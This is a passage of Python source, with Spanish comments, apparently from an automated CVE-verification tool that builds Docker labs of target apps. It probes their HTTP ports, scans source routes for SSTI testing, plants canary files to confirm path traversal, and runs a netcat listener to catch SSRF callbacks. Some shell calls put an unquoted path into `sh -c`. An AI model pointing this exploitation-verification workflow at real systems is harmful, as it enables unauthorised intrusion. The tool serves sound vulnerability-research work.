    """Analogo generico de _Lab (wpverify.py), pero el contenido del contenedor es el que trae
    el propio repo -- no hay imagen base fija ni sabemos de antemano el stack."""

    def __init__(self, tag: str):
        self.tag = tag
        # F28: per-CVE isolated network name prevents cross-lab interference
        self.net = f"bo_net_{tag}"
        self.container = f"binoracle-genverify-{tag}-app"
        self.image = f"binoracle-genverify-{tag}:latest"
        self.compose_project = f"binoracle-genverify-{tag}"
        self.kind = ""
        self._created: List[str] = []
        self._net_created = False

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def container_healthy(self) -> bool:
        """True if the main container is running and passes a basic health check."""
        r = self.sh("inspect", "--format", "{{.State.Running}}", self.container, timeout=10)
        return (r.returncode == 0 and (r.stdout or "").strip().lower() == "true")

    def restart_if_stopped(self) -> bool:
        """Restart a stopped container instead of creating a new one. Returns True if restarted."""
        r = self.sh("inspect", "--format", "{{.State.Status}}", self.container, timeout=10)
        status = (r.stdout or "").strip().lower()
        if status == "exited":
            rr = self.sh("start", self.container, timeout=30)
            return rr.returncode == 0
        return False

    def build_and_run(self, target: dict, timeout_build=600.0, timeout_run=60.0):
        self.kind = target["kind"]
        if self.kind == "dockerfile":
            # --network host (en el build en si, no solo en el contenedor final) + el proxy
            # saliente como --build-arg: el ENV HTTPS_PROXY que _proxy_dockerfile_lines() mete
            # en el Dockerfile no tiene efecto si el daemon de build no puede alcanzar siquiera
            # ese proxy -- ver _proxy_dockerfile_lines() para el porque completo. Sin
            # BINORACLE_DOCKER_BUILD_CA_CERT fijada, esto es un no-op (misma invocacion que
            # siempre, ningun despliegue sin este proxy concreto se ve afectado).
            proxy_build_args: List[str] = []
            _ca_cert = (os.environ.get("BINORACLE_DOCKER_BUILD_CA_CERT", "") or
                        os.environ.get("SSL_CERT_FILE", ""))
            if _ca_cert and os.path.isfile(_ca_cert):
                proxy_build_args = ["--network", "host", "--build-arg",
                                   f"HTTPS_PROXY={os.environ.get('HTTPS_PROXY', '')}"]
            # Retry on Docker Hub rate-limit (HTTP 429) with exponential backoff.
            # Caps at 3 attempts; on each retry we wait longer (60s, 120s) before rebuilding.
            _max_build_attempts = 3
            r = None
            for _attempt in range(_max_build_attempts):
                r = self.sh("build", "--platform", "linux/amd64", "-t", self.image,
                           *proxy_build_args, "-f", target["path"], target["context"],
                           timeout=timeout_build)
                if r.returncode == 0:
                    break
                combined = (r.stdout or "") + (r.stderr or "")
                if "429" in combined or "toomanyrequests" in combined.lower():
                    _wait = 60 * (2 ** _attempt)
                    if _attempt + 1 < _max_build_attempts:
                        time.sleep(_wait)
                        continue
                break
            if r.returncode != 0:
                return r
            net_r = self.sh("network", "create", self.net, timeout=30)
            if net_r.returncode != 0:
                combined = (net_r.stdout or "") + (net_r.stderr or "")
                if "address pools" in combined or "fully subnetted" in combined:
                    # Prune orphaned networks and retry once
                    import subprocess as _sp
                    _sp.run(["docker", "network", "prune", "-f"], capture_output=True, timeout=30)
                    net_r = self.sh("network", "create", self.net, timeout=30)
                if net_r.returncode != 0:
                    return net_r
            self._created.append(("network", self.net))
            self._created.append(("image", self.image))
            r = self.sh("run", "-d", "--platform", "linux/amd64", "--name", self.container,
                       "--network", self.net, "-P",
                       "--cpus", "2.0", "--memory", "1g", "--pids-limit", "500",
                       self.image, timeout=timeout_run)
            if r.returncode == 0:
                self._created.append(("container", self.container))
            return r
        else:
            # Rewrite fixed host ports in compose file if any are already in use
            _port_remaps = _patch_compose_ports(target["path"])
            if _port_remaps:
                # Store remaps so callers can find the actual host ports
                self._port_remaps = _port_remaps
            # C11: inject platform: linux/amd64 when BINORACLE_FORCE_AMD64=1 (Mac ARM)
            if os.environ.get("BINORACLE_FORCE_AMD64", "").strip() in ("1", "true", "yes"):
                _patch_compose_platform(target["path"])
            env = dict(os.environ, COMPOSE_PROJECT_NAME=self.compose_project)
            r = subprocess.run(["docker", "compose", "-f", target["path"], "-p",
                                self.compose_project, "up", "-d", "--build"],
                               cwd=target["context"], env=env, capture_output=True, text=True,
                               timeout=timeout_build)
            # C11: on exec format error, retry with platform injection
            if r.returncode != 0:
                _combined = (r.stdout or "") + (r.stderr or "")
                if ("exec format error" in _combined or
                        "requested platform" in _combined or
                        "does not match" in _combined):
                    _patched = _patch_compose_platform(target["path"])
                    if _patched:
                        r = subprocess.run(
                            ["docker", "compose", "-f", target["path"], "-p",
                             self.compose_project, "up", "-d", "--build"],
                            cwd=target["context"], env=env, capture_output=True, text=True,
                            timeout=timeout_build)
            self._created.append(("compose", target["path"]))
            return r

    def running_containers(self, timeout=15.0) -> List[str]:
        if self.kind == "dockerfile":
            return [self.container]
        r = self.sh("ps", "-a", "--filter", f"label=com.docker.compose.project={self.compose_project}",
                   "--format", "{{.Names}}", timeout=timeout)
        return [n for n in (r.stdout or "").splitlines() if n.strip()]

    def published_ports(self, container: str, timeout=15.0) -> List[str]:
        """Puertos del HOST publicados para `container` (sea `docker run -P` o los `ports:` del
        compose) -- `docker port` los lista sin tener que adivinar ni parsear YAML."""
        r = self.sh("port", container, timeout=timeout)
        ports = []
        for line in (r.stdout or "").splitlines():
            m = re.search(r":(\d+)\s*$", line.strip())
            if m:
                ports.append(m.group(1))
        return ports

    # Señales de "CMS realmente listo" en los logs del contenedor. Algunos CMSs responden
    # HTTP antes de haber terminado su inicialización (migraciones, primer arranque) lo que
    # genera falsos positivos en discover_http — las peticiones llegan a un app a medio boot.
    _CMS_READY_SIGNALS: dict = {
        "ghost":            ["Ghost is running in development", "Your site is accessible"],
        "strapi":           ["Project is fully loaded", "Project started"],
        "directus":         ["Server started", "Directus ready", "Starting server on"],
        "payload":          ["Listening on port", "Server started"],
        "wagtail":          ["Starting development server", "Quit the server"],
        "djangocms":        ["Starting development server", "Quit the server"],
        "drupal":           ["apache2-foreground", "AH00558: apache2"],
        "joomla":           ["apache2-foreground", "AH00558: apache2"],
        "typo3":            ["apache2-foreground", "AH00558: apache2"],
        "contao":           ["apache2-foreground", "AH00558: apache2"],
        "prestashop":       ["apache2-foreground", "AH00558: apache2"],
        "craft":            ["apache2-foreground", "AH00558: apache2"],
        "pgadmin":          ["pgAdmin 4 - Application Initialisation"],
        "audiobookshelf":   ["Listening on port", "Server started"],
        "mattermost":       ["Server is listening on", "Started Server"],
        "gitea":            ["Listening on port"],
        "paperless":        ["Ready for connections", "Listening on"],
        "nextcloud":        ["Apache started successfully", "Starting Apache"],
    }

    def _container_ip(self, container: str, timeout=10.0) -> Optional[str]:
        """IP interna del contenedor dentro de su red Docker — útil cuando no hay puertos
        publicados (Dockerfile sin EXPOSE). Devuelve None si no se puede determinar."""
        try:
            r = self.sh("inspect",
                        "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
                        container, timeout=timeout)
            ip = (r.stdout or "").strip().split("\n")[0].strip()
            return ip if ip else None
        except Exception:
            return None

    def discover_http(self, tries: int = 60, delay: float = 3.0,
                      cms: Optional[str] = None) -> Optional[tuple]:
        """Prueba TODOS los puertos publicados de TODOS los contenedores levantados hasta que uno
        responda HTTP (status < 500) -- sin asumir cual de los contenedores del compose es el
        servidor web ni en que puerto escucha. Devuelve (container, port) o None.

        urlopen() LANZA HTTPError para cualquier respuesta 4xx/5xx en vez de devolverla (solo los
        2xx/3xx llegan al `with` de abajo) -- confirmado en vivo que, sin capturarla aparte, un
        objetivo que solo expone rutas POST (su raiz responde 404/501, no 2xx) nunca se detectaba
        como 'listo' aunque estuviera arriba de verdad. Una URLError (sin respuesta HTTP en
        absoluto -- conexion rechazada, nombre no resuelto) si sigue significando 'aun no'.

        `cms`: cuando se conoce el CMS (detectado por _detect_cms_fingerprint), también espera
        una señal específica en los logs del contenedor que indica que la inicialización completó
        (p.ej. Ghost completa migraciones antes de emitir "Ghost is running in development") —
        evita falsos positivos donde HTTP responde pero la app aún está a medio arrancar.
        Los tries se aumentan automáticamente para CMSs pesados (Ghost, Strapi, Payload).
        """
        import urllib.error
        import urllib.request
        # CMSs con arranque largo (bootstrap DB incluido): 90 tries × 3s = 4.5 min máximo
        heavy_cms = {"ghost", "directus", "payload", "drupal", "joomla", "craft",
                     "typo3", "contao", "prestashop",
                     # Ruby/Python heavy-boot: Rails runs db:migrate at startup; Django
                     # may run migrations; Gradio downloads model weights on first run
                     "rails", "django", "gradio",
                     # Slow-boot apps that take 90-120s before HTTP is ready
                     "pgadmin", "mattermost", "nextcloud", "paperless", "audiobookshelf",
                     # Zitadel: initialises SQLite/Postgres on start-from-init; needs 60s+
                     "zitadel"}
        # Strapi 5.x compiles TypeScript + migrates SQLite before serving; needs up to 6min
        very_heavy_cms = {"strapi"}
        if cms and cms.lower() in very_heavy_cms and tries < 120:
            tries = 120
        elif cms and cms.lower() in heavy_cms and tries < 90:
            tries = 90
        ready_signals = self._CMS_READY_SIGNALS.get((cms or "").lower(), [])
        host = _lab_host()
        for _try in range(tries):
            # Para CMSs con señal conocida: verificar primero los logs antes de probar HTTP
            if ready_signals and _try > 0 and _try % 5 == 0:
                for c in self.running_containers():
                    logs_text = self.logs_tail(c, lines=50)
                    if any(sig.lower() in logs_text.lower() for sig in ready_signals):
                        # App lista según sus propios logs — ahora sí buscar puerto
                        ports = self.published_ports(c)
                        for port in ports:
                            try:
                                with urllib.request.urlopen(f"http://{host}:{port}/", timeout=5) as r:
                                    if r.status < 500:
                                        return (c, port)
                            except urllib.error.HTTPError as e:
                                if e.code < 500:
                                    return (c, port)
                            except Exception:
                                continue
            # Siempre intentar HTTP directamente (para apps sin señal específica).
            # Algunas apps (Gradio 4.x) devuelven 500 en "/" pero 200 en rutas propias;
            # probar estas rutas alternativas antes de dormir.
            _FALLBACK_PROBE_PATHS = ["/info", "/health", "/queue/status", "/api/health",
                                      "/misc/ping",   # pgAdmin 4
                                      "/ping",        # various apps
                                      "/status",      # general status
                                      ]
            for c in self.running_containers():
                ports = self.published_ports(c)
                # Cuando el Dockerfile no tiene EXPOSE (o el run no usó -P), `docker port` devuelve
                # nada — sondear puertos comunes directamente sobre la IP del contenedor.
                if not ports:
                    _ip = self._container_ip(c)
                    if _ip:
                        _probe_host = _ip
                        ports = [str(p) for p in _COMMON_PORTS]
                    else:
                        continue
                else:
                    _probe_host = host
                for port in ports:
                    _root_gave_5xx = False
                    try:
                        with urllib.request.urlopen(f"http://{_probe_host}:{port}/", timeout=4) as r:
                            if r.status < 500:
                                # Si hay señal de CMS: solo aceptar si ya aparece en logs
                                if ready_signals:
                                    logs_text = self.logs_tail(c, lines=30)
                                    if not any(sig.lower() in logs_text.lower() for sig in ready_signals):
                                        continue  # HTTP arriba pero CMS aún inicializando
                                return (c, port, _probe_host)
                    except urllib.error.HTTPError as e:
                        if e.code < 500:
                            if ready_signals:
                                logs_text = self.logs_tail(c, lines=30)
                                if not any(sig.lower() in logs_text.lower() for sig in ready_signals):
                                    continue
                            return (c, port, _probe_host)
                        _root_gave_5xx = True
                    except Exception:
                        continue
                    # Root devolvió 5xx — probar rutas alternativas conocidas
                    if _root_gave_5xx:
                        for _probe in _FALLBACK_PROBE_PATHS:
                            try:
                                with urllib.request.urlopen(
                                        f"http://{_probe_host}:{port}{_probe}", timeout=3) as r:
                                    if r.status < 500:
                                        return (c, port, _probe_host)
                            except urllib.error.HTTPError as e:
                                if e.code < 500:
                                    return (c, port, _probe_host)
                            except Exception:
                                continue
            time.sleep(delay)
        return None

    def logs_tail(self, name: str, lines: int = 80) -> str:
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def read_file(self, container: str, path: str, timeout=10.0) -> str:
        r = self.sh("exec", container, "sh", "-c", f"cat {path} 2>/dev/null", timeout=timeout)
        return r.stdout or ""

    def write_canary(self, container: str, path: str, content: str, timeout=15.0) -> bool:
        """Analogo de _Lab.write_canary (wpverify.py): planta un fichero DENTRO del contenedor
        real del objetivo (via `docker exec`, no en ningun volumen compartido -- aqui no sabemos
        de antemano si existe uno) para confirmar path-traversal/LFI de verdad."""
        r = self.sh("exec", "-i", container, "sh", "-c", f"cat > {path}",
                   input_text=content, timeout=timeout)
        return r.returncode == 0

    def resolve_network(self, timeout=15.0) -> Optional[str]:
        """Red Docker del laboratorio -- para `dockerfile` ya la creamos nosotros (self.net); para
        `compose`, docker compose crea la suya propia (convencion `<proyecto>_default`, pero no
        hay que confiar en la convencion: se busca por la etiqueta real que compose pone en toda
        red que crea)."""
        if self.kind == "dockerfile":
            return self.net
        r = self.sh("network", "ls", "--filter",
                   f"label=com.docker.compose.project={self.compose_project}",
                   "--format", "{{.Name}}", timeout=timeout)
        names = [n for n in (r.stdout or "").splitlines() if n.strip()]
        return names[0] if names else None

    def start_listener(self, timeout: float = 30.0) -> Optional[str]:
        """Analogo de _Lab.start_listener: un contenedor Alpine en la MISMA red del laboratorio
        que solo escucha TCP/8080 y vuelca cualquier conexion entrante -- sirve para confirmar
        SSRF generico igual que en WordPress: si el objetivo hace de verdad una peticion saliente
        hacia aqui, queda grabada con el token unico que iba en la ruta."""
        net = self.resolve_network(timeout=timeout)
        if not net:
            return None
        self.listener = f"binoracle-genverify-{self.tag}-ssrf"
        r = self.sh("run", "-d", "--name", self.listener, "--network", net, _ALPINE_IMAGE,
                   "sh", "-c", "while true; do nc -l -p 8080 >> /var/log/ssrf.log 2>&1; done",
                   timeout=timeout)
        if r.returncode != 0:
            return None
        self._created.append(("container", self.listener))
        return self.listener

    def listener_log(self, timeout: float = 10.0) -> str:
        r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
        return (r.stdout or "") if r.returncode == 0 else ""

    def container_ip(self, name: str, timeout: float = 10.0) -> Optional[str]:
        """IP interna real del contenedor `name` en la red del laboratorio -- para las variantes
        de SSRF que apuntan al listener por IP (decimal/hex/octal) en vez de por nombre."""
        net = self.resolve_network(timeout=timeout)
        if not net:
            return None
        r = self.sh("inspect", "-f",
                   f"{{{{(index .NetworkSettings.Networks \"{net}\").IPAddress}}}}",
                   name, timeout=timeout)
        ip = (r.stdout or "").strip()
        return ip or None

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "image":
                    self.sh("rmi", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
                elif kind == "compose":
                    subprocess.run(["docker", "compose", "-f", name, "-p", self.compose_project,
                                    "down", "-v"], capture_output=True, timeout=60)
            except Exception:
                pass


def _scan_web_routes(source_dir: str) -> list:
    """Scan source dir for HTTP endpoints and their parameters.

    Reads Python (Flask/Django) and Ruby (Sinatra/Rack) files in source_dir
    and extracts route definitions + parameter names. Returns list of
    (endpoint_path, params_dict, http_method) sorted by specificity.

    Used as a pre-flight in verify_generic_ssti so the verifier tries
    the ACTUAL routes before falling back to the LLM-guessed endpoint.
    This is the binoracle autonomy gap fix: the LLM hypothesis is seeded
    from the CVE description (which doesn't mention specific lab routes),
    but the source code *does* -- scanning it removes the dependence on
    the LLM guessing the right endpoint.
    """
    import glob as _glob
    routes: list = []
    if not source_dir or not os.path.isdir(source_dir):
        return routes

    # --- Flask (Python) ---
    for py_file in _glob.glob(os.path.join(source_dir, "**", "*.py"), recursive=True):
        try:
            lines = open(py_file).readlines()
        except Exception:
            continue
        cur_ep: Optional[str] = None
        cur_meth = "GET"
        cur_params: dict = {}
        for line in lines:
            s = line.strip()
            # @app.route("/path") or @bp.route("/path", methods=["POST"])
            m_route = re.match(
                r'@\w+\.route\(["\']([^"\']+)["\'](?:[^)]*methods\s*=\s*\[([^\]]+)\])?', s)
            if m_route:
                if cur_ep is not None:
                    routes.append((cur_ep, dict(cur_params), cur_meth))
                cur_ep = m_route.group(1)
                methstr = m_route.group(2) or ""
                meths = [x.strip().strip('"\'').upper()
                         for x in methstr.split(",") if x.strip().strip('"\'')]
                cur_meth = meths[0] if meths else "GET"
                cur_params = {}
            elif cur_ep is not None:
                for pm in re.finditer(
                        r'request\.(?:args|values)\.get\(["\']([^"\']+)["\']', s):
                    cur_params[pm.group(1)] = ""
                for pm in re.finditer(
                        r'request\.form\.get\(["\']([^"\']+)["\']', s):
                    cur_params[pm.group(1)] = ""
                    cur_meth = "POST"
                # Detect render_template / render_template_string calls: marks render endpoints
                if re.search(r'render_template\s*\(', s):
                    cur_params["__RENDERS_TEMPLATE__"] = "1"
        if cur_ep is not None:
            routes.append((cur_ep, dict(cur_params), cur_meth))

    # --- aiohttp (Python): add_static('/prefix', root, follow_symlinks=...) ---
    # Confirmado en vivo con CVE-2024-23334: el LLM propone endpoint '/static/<path:path>'
    # (con sintaxis de plantilla) que no se detecta como URL_PATH y falla la URL construction.
    # Escaneando add_static() directamente se obtiene el prefijo limpio '/static/' como URL_PATH.
    for py_file in _glob.glob(os.path.join(source_dir, "**", "*.py"), recursive=True):
        try:
            content = open(py_file).read()
        except Exception:
            continue
        for m_as in re.finditer(
            r'(?:app|router)(?:\.router)?\.add_static\s*\(\s*["\']([^"\']+)["\']',
            content
        ):
            prefix = m_as.group(1).rstrip("/") + "/"
            routes.append((prefix, {"URL_PATH": ""}, "GET"))

    # --- Sinatra / plain Rack (Ruby) --- includes config.ru (*.ru) and *.rb
    _rb_files = (_glob.glob(os.path.join(source_dir, "**", "*.rb"), recursive=True) +
                 _glob.glob(os.path.join(source_dir, "**", "*.ru"), recursive=True))
    for rb_file in _rb_files:
        try:
            lines = open(rb_file).readlines()
        except Exception:
            continue
        full_rb = "".join(lines)
        # Rack::Static (multi-line): use Rack::Static, ... urls: [...] ...
        # Uses full-file scan because the declaration spans several lines.
        # Strategy: find each `Rack::Static` occurrence and extract the NEXT 400 chars as block.
        for m_static_pos in [m.start() for m in re.finditer(r'Rack::Static', full_rb)]:
            block = full_rb[m_static_pos:m_static_pos + 400]
            m_urls = re.search(r'urls\s*:\s*\[([^\]]+)\]', block, re.DOTALL)
            if not m_urls:
                continue
            # Extract root: (optional, for prefix-bypass canary planting)
            rack_root = ""
            m_root_str = re.search(r'root\s*:\s*["\']([^"\']+)["\']', block)
            m_root_dir = re.search(r'root\s*:\s*__dir__', block)
            m_root_join = re.search(
                r'root\s*:\s*File\.join\(__dir__\s*,\s*["\']([^"\']+)["\']', block)
            if m_root_str:
                rack_root = m_root_str.group(1)
            elif m_root_dir:
                # root: __dir__ → el root es el propio WORKDIR del contenedor
                rack_root = "WORKDIR/"
            elif m_root_join:
                rack_root = "WORKDIR/" + m_root_join.group(1)
            urls_str = m_urls.group(1)
            for pu in re.finditer(r'["\']([^"\']+)["\']', urls_str):
                prefix = pu.group(1).rstrip("/") + "/"
                params: dict = {"URL_PATH": ""}
                if rack_root:
                    params["RACK_STATIC_ROOT"] = rack_root
                routes.append((prefix, params, "GET"))
        for line in lines:
            s = line.strip()
            # get '/path' do ... or post '/path' do ...
            m_rb = re.match(r'(get|post|put|patch|delete)\s+["\']([^"\']+)["\']', s)
            if m_rb:
                routes.append((m_rb.group(2), {}, m_rb.group(1).upper()))

    # --- Node.js plain-http / Express (server.js) ---
    # Detecta patrones como: req.url.startsWith('/cmd') o app.get('/cmd', ...)
    for js_file in _glob.glob(os.path.join(source_dir, "**", "*.js"), recursive=True):
        try:
            content = open(js_file).read()
        except Exception:
            continue
        # req.url.startsWith('/path')
        for m_node in re.finditer(r'req\.url\.startsWith\(["\']([^"\']+)["\']', content):
            ep = m_node.group(1)
            # Busca el parametro en url.parse(...).query[...] en el contexto circundante
            ctx = content[max(0, m_node.start() - 50):m_node.start() + 300]
            params: dict = {}
            for pm in re.finditer(r'q\[["\']([^"\']+)["\']', ctx):
                params[pm.group(1)] = ""
            routes.append((ep, params, "GET"))
        # Express: app.get('/path', ...) / router.post('/path', ...)
        for m_exp in re.finditer(
                r'(?:app|router)\.(get|post|put|patch|delete)\s*\(\s*["\']([^"\']+)["\']',
                content):
            meth = m_exp.group(1).upper()
            ep = m_exp.group(2)
            routes.append((ep, {}, meth))

    # --- TypeScript (h3/Hono/Nitro/Express-TS): scan .ts files for route patterns ---
    for ts_file in _glob.glob(os.path.join(source_dir, "**", "*.ts"), recursive=True):
        try:
            content = open(ts_file).read()
        except Exception:
            continue
        # Express/NestJS: app.get('/path', ...) / router.post('/path', ...)
        for m_exp in re.finditer(
                r'(?:app|router|server)\.(get|post|put|patch|delete)\s*\(\s*["\']([^"\']+)["\']',
                content):
            routes.append((m_exp.group(2), {}, m_exp.group(1).upper()))
        # Hono: app.get('/path', ...) — same pattern
        # h3: defineEventHandler with no explicit route in URL — skip
        # Nitro: eventHandler / H3Event routes via useRouter().get('/path', ...)
        for m_h3 in re.finditer(
                r'router\s*\.\s*(get|post|put|patch|delete)\s*\(\s*["\']([^"\']+)["\']',
                content):
            routes.append((m_h3.group(2), {}, m_h3.group(1).upper()))
        # Hono: c.req.param('/path') — static serving
        for m_hon in re.finditer(
                r'(?:app|hono)\.(get|post|put|patch|delete)\s*\(\s*["\']([^"\']+)["\']',
                content):
            routes.append((m_hon.group(2), {}, m_hon.group(1).upper()))

    # --- PHP Laravel / Slim / Craft CMS: scan routes/*.php and index.php ---
    _php_route_files = (
        _glob.glob(os.path.join(source_dir, "routes", "*.php"), recursive=False) +
        _glob.glob(os.path.join(source_dir, "**", "web.php"), recursive=True) +
        _glob.glob(os.path.join(source_dir, "**", "api.php"), recursive=True) +
        _glob.glob(os.path.join(source_dir, "index.php"), recursive=False)
    )
    for php_file in _php_route_files:
        try:
            content = open(php_file, encoding="utf-8", errors="replace").read()
        except Exception:
            continue
        # Laravel: Route::get('/path', ...) / Route::post('/path', ...)
        for m_lv in re.finditer(
                r'Route::(get|post|put|patch|delete|any)\s*\(\s*["\']([^"\']+)["\']',
                content, re.IGNORECASE):
            meth = m_lv.group(1).upper()
            ep = m_lv.group(2)
            routes.append((ep, {}, meth if meth != "ANY" else "GET"))
        # Slim: $app->get('/path', ...) / $app->post('/path', ...)
        for m_slim in re.finditer(
                r'\$app->(get|post|put|patch|delete)\s*\(\s*["\']([^"\']+)["\']',
                content, re.IGNORECASE):
            routes.append((m_slim.group(2), {}, m_slim.group(1).upper()))

    # Deduplicate while preserving order
    seen: set = set()
    uniq = []
    for r in routes:
        key = (r[0], r[2])
        if key not in seen:
            seen.add(key)
            uniq.append(r)
    return uniq


def _diagnose_infra_error(e: Exception, source_dir: str = "", base_url: str = "") -> str:
    """Razona el error de infraestructura y devuelve un mensaje de diagnostico especifico.
    Convierte errores genericos ('timeout', 'connection refused', etc.) en explicaciones
    utiles con causas y sugerencias de accion."""
    import subprocess as _sp
    msg = str(e)
    is_next = "next_autonomous" in source_dir or "next" in source_dir.lower()
    is_timeout = isinstance(e, (_sp.TimeoutExpired,)) or "timeout" in msg.lower() or "timed out" in msg.lower()

    if is_timeout:
        if is_next:
            return (
                "timeout de arranque del lab Next.js -- Next.js 15.x en dev mode tarda "
                "60-120s en compilar la primera peticion. El contenedor arranco pero la "
                "app aun no estaba lista. Reintenta con --no-cache para un lab limpio"
            )
        return (
            f"timeout de infraestructura: el laboratorio no respondio a tiempo -- "
            f"puede que Docker tardara en construir la imagen o el servidor necesite "
            f"mas tiempo de arranque. Reintenta con --no-cache. Detalle: {e}"
        )
    if "connection refused" in msg.lower() or "connectionrefused" in msg.lower():
        return (
            f"conexion rechazada{(' en ' + base_url) if base_url else ''} -- "
            f"el servidor arranco pero cerro el puerto o no llego a escuchar. "
            f"Revisa los logs del contenedor con: docker logs <contenedor>"
        )
    if "docker" in msg.lower() and ("not found" in msg.lower() or "daemon" in msg.lower()):
        return (
            "Docker no esta corriendo o no esta en el PATH -- "
            "arranca Docker Desktop (Mac/Windows) o 'sudo systemctl start docker' (Linux) "
            f"y vuelve a intentarlo. Detalle: {e}"
        )
    if "no space left" in msg.lower():
        return (
            "sin espacio en disco -- Docker no puede construir la imagen del lab. "
            "Libera espacio con: docker system prune -f"
        )
    if "permission denied" in msg.lower():
        return (
            f"permiso denegado -- puede que Docker necesite sudo o que el usuario "
            f"no este en el grupo 'docker'. Detalle: {e}"
        )
    # Generico pero con el mensaje completo para diagnostico
    return f"error inesperado: {e}"


def _capture_container_logs_on_failure(container: str, res: "WpVerifyResult",
                                       step, tail: int = 50) -> None:
    """Capture the last `tail` lines of Docker container logs into res.evidence.
    Annotates common root causes so the LLM can reason about why the lab failed."""
    if not container or container == "prebuilt":
        return
    try:
        import subprocess as _splog
        _lr = _splog.run(["docker", "logs", "--tail", str(tail), container],
                         capture_output=True, text=True, timeout=8)
        _last = ((_lr.stdout or "") + (_lr.stderr or ""))[-2000:]
        if not _last.strip():
            return
        res.evidence["container_logs_on_failure"] = _last[-800:]
        _lower = _last.lower()
        if "fatal error" in _lower or "php fatal" in _lower:
            res.evidence["failure_root_cause"] = "php_fatal"
            step("[log] PHP fatal en logs del contenedor — plugin incompatible con PHP version")
        elif ("table" in _lower and ("doesn't exist" in _lower or "not found" in _lower)):
            res.evidence["failure_root_cause"] = "missing_table"
            step("[log] tabla no encontrada — plugin necesita setup adicional")
        elif "eaddrinuse" in _lower or "address already in use" in _lower:
            res.evidence["failure_root_cause"] = "port_conflict"
            step("[log] puerto ya en uso — conflicto de puertos del lab")
        elif "error establishing a database connection" in _lower:
            res.evidence["failure_root_cause"] = "db_connection_failed"
            step("[log] conexion a DB fallida en el laboratorio")
    except Exception:
        pass


def _discover_routes_from_openapi(base_url: str, step) -> List[str]:
    """Try common OpenAPI/Swagger spec endpoints and parse paths from the spec.

    Returns a list of route paths (e.g. ["/api/users", "/api/admin/users"]).
    Returns [] when no spec is reachable or parseable.
    """
    _SPEC_PATHS = [
        "/openapi.json", "/swagger.json", "/api-docs",
        "/api/swagger", "/api/openapi.json", "/api/v1/openapi.json",
        "/api/v2/openapi.json", "/swagger/v1/swagger.json",
        "/api-docs/swagger.json", "/.well-known/openapi.json",
    ]
    from .wpverify import _http_request
    for sp in _SPEC_PATHS:
        url = base_url.rstrip("/") + sp
        try:
            r = _http_request("GET", url, timeout=5)
            if r.status_code != 200 or not r.text:
                continue
            spec = json.loads(r.text)
            paths = list((spec.get("paths") or {}).keys())
            if paths:
                step(f"  openapi: {len(paths)} rutas descubiertas desde {sp}")
                return paths[:30]
        except Exception:
            continue
    return []


class _DockerLab:
    """Context-manager wrapper around _bootstrap_generic_lab for specialized verifiers
    (info-disclosure, CORS, user-enum, etc.) that need exec_in_container().
    Previously imported from wpverify as _DockerLab (which never existed there).
    """
    def __init__(self, source_dir: str, dockerfile_body: Optional[str] = None,
                 extra_files: Optional[dict] = None,
                 setup_commands: Optional[List[str]] = None,
                 on_step=None,
                 docker_image: str = ""):
        self._source_dir = source_dir or ""
        self._df = dockerfile_body or ""
        self._extra_files = extra_files or {}
        self._setup_cmds = setup_commands or []
        self._step = on_step or (lambda _m: None)
        self._docker_image = docker_image or ""
        self._lab: Optional["_GenericLab"] = None
        self._container: str = ""
        self.base_url: str = ""

    def running(self):
        """Context manager: bootstrap lab, yield self (with .base_url set), teardown on exit."""
        import contextlib

        @contextlib.contextmanager
        def _ctx():
            _res = WpVerifyResult()
            _boot = _bootstrap_generic_lab(
                self._source_dir, self._step, _res, 900.0,
                dockerfile_body=self._df,
                extra_files=self._extra_files,
                setup_commands=self._setup_cmds,
                docker_image=self._docker_image,
            )
            if _boot is None:
                raise RuntimeError(f"_DockerLab bootstrap failed: {_res.detail}")
            _lab, _base_url, _container = _boot
            self._lab = _lab
            self._container = _container
            self.base_url = _base_url

            class _Boot:
                pass
            b = _Boot()
            b.base_url = _base_url
            try:
                yield b
            finally:
                if _lab:
                    try:
                        _lab.teardown()
                    except Exception:
                        pass

        return _ctx()

    def teardown(self) -> None:
        """Explicit teardown — delegates to inner lab if still live. Safe to call after `running()`."""
        if self._lab is not None:
            try:
                self._lab.teardown()
            except Exception:
                pass
            self._lab = None

    def exec_in_container(self, cmd: str) -> bool:
        """Run cmd via docker exec in the main container. Returns True on success."""
        if not self._lab or not self._container:
            return False
        try:
            r = self._lab.sh("exec", self._container, "sh", "-c", cmd, timeout=30)
            return r.returncode == 0
        except Exception:
            return False


def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
                           budget_s: float, setup_commands: Optional[List[str]] = None,
                           dockerfile_body: str = "",
                           extra_files: Optional[dict] = None,
                           prebuilt_url: str = "",
                           pkg_version: str = "",
                           docker_image: str = "") -> Optional[tuple]:
    """Pasos comunes a TODOS los verificadores genericos: detectar como arrancar el objetivo,
    construirlo/arrancarlo, y encontrar por donde habla HTTP. Devuelve (lab, base_url, container)
    o None con `res` ya relleno (detail/logs/limitations) -- el caller solo tiene que `return res`.

    `setup_commands` (opcional): comandos de shell reales, ejecutados via `docker exec` DENTRO del
    contenedor ya arriba, DESPUES de confirmar que responde HTTP pero ANTES de lanzar cualquier
    ataque -- analogo generico del `extra_setup_script` que drupalverify.py ya tiene para Views
    que necesitan contenido real. Confirmado como necesario en vivo contra CVE-2026-65694
    (Microweber): el framework (Laravel) responde HTTP 200 en CUALQUIER ruta mientras la app no
    esta instalada (migraciones/base de datos), incluida la propia ruta vulnerable -- sin esto,
    cualquier generico que arranque el objetivo con `docker compose up` a secas prueba contra una
    app a medio arrancar y nunca llega al codigo real, sea o no vulnerable (falso negativo por
    entorno, no por el payload). Si CUALQUIER comando falla, se aborta con el detalle real en vez
    de seguir probando contra un objetivo que sabemos a medias.

    `dockerfile_body` (opcional): si se proporciona, se usa DIRECTAMENTE como Dockerfile para
    construir el lab -- tiene prioridad absoluta sobre cualquier Dockerfile/docker-compose.yml
    que el repo descargado pudiera traer (resuelve el caso Gradio donde el repo tiene su propio
    test/test_docker/docker-compose.yml que falla al construir fuera del entorno de desarrollo).

